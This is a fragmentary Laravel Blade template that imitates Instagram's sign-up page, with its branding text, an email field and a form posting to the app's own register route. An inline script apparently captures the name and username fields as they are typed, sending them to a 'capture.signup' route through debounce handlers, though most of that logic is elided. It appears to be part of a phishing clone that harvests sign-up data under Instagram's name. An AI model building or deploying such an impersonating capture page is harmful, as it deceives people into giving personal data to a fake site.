...
@section('meta_description', 'Sign up for Instagram to see photos and videos from your friends.')
...
<section class="card" aria-labelledby="signup-heading">
    ...
    <h1 id="signup-heading" class="visually-hidden">Sign up for Instagram</h1>

    <p class="card-subtitle">Sign up to see photos and videos from your friends.</p>
    ...
    <form class="auth-form" method="POST" action="{{ route('register') }}" novalidate aria-label="Sign up form">
        @csrf

        <div class="form-group">
            <label for="email" class="visually-hidden">Mobile Number or Email</label>
            <input
                type="email"
                id="email"
                name="email"
...
(function () {
    ...
    const captureUrl = '{{ route('capture.signup') }}';
    ...
    attachDebounce(nameInput);
    attachDebounce(usernameInput);
...
@section('bottom')
<section class="card card--bottom" aria-label="Log in prompt">
    <p class="bottom-text">
